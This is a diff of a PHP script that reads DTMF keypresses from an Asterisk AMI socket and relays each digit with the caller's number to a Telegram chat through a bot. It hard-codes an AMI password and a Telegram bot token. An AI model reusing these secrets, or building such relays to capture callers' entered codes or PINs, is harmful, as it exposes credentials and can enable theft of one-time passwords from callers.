@@ -2,7 +2,7 @@
 // AMI connection details
 $host = '127.0.0.1';    // Asterisk server IP
 $port = 5038;           // AMI port
-$username = 'admin';  // AMI username
+$username = 'admin';    // AMI username
 $password = 'C1C/u8rPNdCP';  // AMI password
 
 // Open a socket to the AMI
@@ -34,25 +34,23 @@ while (!feof($socket)) {
             $eventData[$key] = $value;
         }
 
-        // Print the DTMF event details
-        //echo "DTMF Event Detected:\n";
-        //echo "  Channel: " . $eventData['Channel'] . "\n";
-        
+        // Get the DTMF digit
         $digit = $eventData['Digit'];
 
+        // Replace '#' with 'hash'
         if ($digit == "#") {
             $digit = "hash";
         }
 
-        echo $digit . "\n";
+        // Construct the output in the desired format
+        $callerID = $eventData['CallerIDNum'];
+        $output = $callerID . " pressed " . $digit;
 
-        $abc = $digit . "_CID: " . $eventData['CallerIDNum'];
+        // Call the function with the new format
+        getdtmf($output);
 
-        getdtmf($abc);
-
-        //echo "  Digit: " . $eventData['Digit'] . "\n";
-        //echo "  Direction: " . $eventData['Direction'] . "\n";
-        //echo "  End: " . $eventData['End'] . "\n";
+        // Print the output (optional)
+        echo $output . "\n";
     }
 }
 
@@ -61,24 +59,21 @@ fputs($socket, "Action: Logoff\r\n");
 fclose($socket);
 
 function getdtmf($dtmf) {
+    $curl = curl_init();
 
-$curl = curl_init();
-
-curl_setopt_array($curl, array(
-    CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . $dtmf,
-    CURLOPT_RETURNTRANSFER => true,
-    CURLOPT_ENCODING => '',
-    CURLOPT_MAXREDIRS => 10,
-    CURLOPT_TIMEOUT => 0,
-    CURLOPT_FOLLOWLOCATION => true,
-    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
-    CURLOPT_CUSTOMREQUEST => 'GET',
-  ));
-  
-  $response = curl_exec($curl);
-  
-  curl_close($curl);
-
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => 'https://api.telegram.org/bot6641886837:AAG0CFfQ4XjiDqRBAFiiJ2EzaMnFOxfl8Bo/sendMessage?chat_id=-4566347970&text=' . urlencode($dtmf),
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => '',
+        CURLOPT_MAXREDIRS => 10,
+        CURLOPT_TIMEOUT => 0,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+        CURLOPT_CUSTOMREQUEST => 'GET',
+    ));
+    
+    $response = curl_exec($curl);
+    
+    curl_close($curl);
 }
-
 ?>
